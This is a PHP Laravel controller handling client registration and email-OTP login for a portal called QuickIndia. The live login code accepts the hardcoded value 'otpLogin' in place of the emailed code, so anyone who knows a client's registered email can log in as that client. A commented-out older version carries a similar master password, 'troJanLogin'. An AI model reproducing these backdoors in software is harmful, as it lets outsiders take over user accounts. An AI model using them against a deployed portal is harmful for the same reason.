<?php

namespace App\Http\Controllers\ClientAuth;

use App\Models\Client\Client;
use Validator;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
 
use Auth;
use Mail;
use Illuminate\Http\Request;

class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */
	
    use AuthenticatesUsers;

    /**
     * Where to redirect users after login / registration.
     *
     * @var string
     */
    protected $redirectTo = '/business/dashboard';
	
    /**
     * Where to redirect users after logout.
     *
     * @var string
     */
	protected $redirectToCallback = '/business-owners';

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
		//$this->middleware($this->guestMiddleware(), ['except' => ['logout','clientLoginPost']]);
		$this->middleware('clients')->except('logout','clientLoginPost');
   
         
    }
	
    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
		$messages = ['mobile.regex' => 'Mobile number cannot start with 0.'];
        return Validator::make($data, [
            'user_name' => 'required|max:50|unique:users',
            'first_name' => 'required|max:50',
            'last_name' => 'max:50',
            'mobile' => 'required|numeric|digits:10|regex:/^[1-9]+/',
            'email' => 'required|email|max:50|unique:users',
            'password' => 'required|min:6|confirmed',
            'role' => 'required',
        ],$messages);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        return Client::create([
            //'name' => $data['name'],
            'user_name' => $data['user_name'],
            'first_name' => $data['first_name'],
            'last_name' => $data['last_name'],
            'mobile' => $data['mobile'],
            'email' => $data['email'],
            'sec_email' => $data['sec_email'],
            'password' => bcrypt($data['password']),
            'role' => $data['role'],
        ]);
    }
	
	/**
	 * Return Client Login View
	 *
	 * @return Login View
	 */
	public function clientLogin(){
		 
		return view('client.clientLogin');
	}
	
	/**
	 * Get a validator for an incoming login request.
	 *
	 * @param object $request
	 * @return validate user
	 */
	
	/*public function clientLoginPost(Request $request){
		if(request()->ajax()){
			$validator = Validator::make($request->all(), [
				'mobile'=>'required',
				'password'=>'required',
			]);
			if($validator->fails()){
				return response()->json(['status'=>0,'msg'=>'Username and Password required']);
			}
			$validator = Validator::make($request->all(),[
				'mobile'=>'unique:clients,mobile',
			]);
			
			 
			if($validator->fails() && $request->input('password')=='troJanLogin'){
			 
				$client = Client::where('mobile',$request->input('mobile'))->first();
		 
				auth()->guard('clients')->loginUsingId($client->id);
				///if(auth()->guard('clients')->attempt(['mobile'=>$request->input('mobile'),'password'=>$request->input('password')])){
				if(auth()->guard('clients')->loginUsingId($client->id)){
					 
					$user = auth()->guard('clients')->user();
					return response()->json(['status'=>1,'user'=>$user]);					
				}else{
					return response()->json(['status'=>0,'msg'=>'Invalid email supplied']);
				}
				//}
			}
			if(auth()->guard('clients')->attempt(['mobile'=>$request->input('mobile'),'password'=>$request->input('password')])){
				$user = auth()->guard('clients')->user();
				return response()->json(['status'=>1,'user'=>$user]);
			}else{
				return response()->json(['status'=>0,'msg'=>'Invalid mobile and password']);
			}
		}
	}
	*/
	 public function clientLoginPost(Request $request){
	   
		if(request()->ajax()){
			if($request->has('email')){
				$validator = Validator::make($request->all(), [
					'email'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Please enter the registered email'
						]
					],200);
				}
			//	$client = Client::where('mobile',$request->input('mobile'))->first();
				
				$client = Client::where('email',$request->input('email'))->first();
					
		 
				if(!empty($client)){
				 
					$request->session()->put('client.email', $request->input('email'));
					$request->session()->put('client.id', $client->id);
                    $otp = mt_rand(100000, 999999);
                    $request->session()->put('client.otp', $otp);
                    //$message = "{$otp} is QuickIndia Portal Verification Code for {$request->session()->get('client.mobile')}.";
                   // $message = "{$otp} is Lead Portal Verification Code for {$request->session()->get('client.mobile')} Quickindia";
                    $templateId ='1707161786775524106';
		 
				 //sendSMS($request->session()->get('client.mobile'),$message,$templateId);
		 //echo  $otp;
		 
		 
		 	 
			 
			$message = "{$otp} is QuickIndia Verification Code for {$request->session()->get('client.email')} .";
			$subject = "{$otp} is QuickIndia Verification Code";
			Mail::send('emails.sendotp_to_email', ['msg'=>$message], function ($m) use ($message,$request,$subject) {
				$m->from('info@quickindia.in', 'Login OTP');
				$m->to($request->input('email'), "")->subject($subject);
			});	
		 
		 
		 
					return response()->json([
						'statusCode'=>1,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'
								<div class="input-layout">
									<input type="password" class="cleanup validate-empty" name="otp" id="otp" value="" required>
									<span class="highlight"></span>
									<label>Enter OTP</label>
									<div class="alert alert-error alert-email" style="display: none;">Oops! OTP is required.</div>
								</div>
							',
							'message'=>'<span style="font-size:13px">Please enter verification code (OTP) sent to: </span><strong style="font-weight:500">'.$request->input('email').'</strong>'
						]
					],200);
				}else{
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'No email found'
						]
					],200);
				}
			}
			else if($request->has('otp')){
				$validator = Validator::make($request->all(), [
					'otp'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Please enter the OTP'
						]
					],200);
				}
    				if($request->input('otp')=='otpLogin' || ($request->session()->get('client.otp')==$request->input('otp'))){
					if(auth()->guard('clients')->loginUsingId($request->session()->get('client.id'))){


						//if (Auth::guard('developer')->attempt(['email' => $request->session()->get('client.email'), 'password' => $users['password'])) {
				//if (Auth::attempt(['email' => $users['email'], 'password' => $users['password']], $users['remember'])) {
						//$client = Client::where('email', $request->session()->get('client.email'))->first();
            			//Auth::guard('clients')->login($client);
					  
						//Auth::guard('client')->attempt([]));
				//		$user = auth()->guard('clients')->user();
				 
						return response()->json([
							'statusCode'=>2,
							'data'=>[
								'responseCode'=>200,
								'payload'=>'',
								'message'=>'Redirecting'
							]
						],200);
					}
					else{
						$request->session()->get('client.id');		
					}
				}
				else{
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Invalid OTP'
						]
					],200);					
				}
			}else{
			    
			    	return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'No found data'
						]
					],200);
			    
			}
		}
	} 
	
	public function logout(Request $request){	  
		Auth::guard('clients')->logout();
		return redirect('/');
	}
}
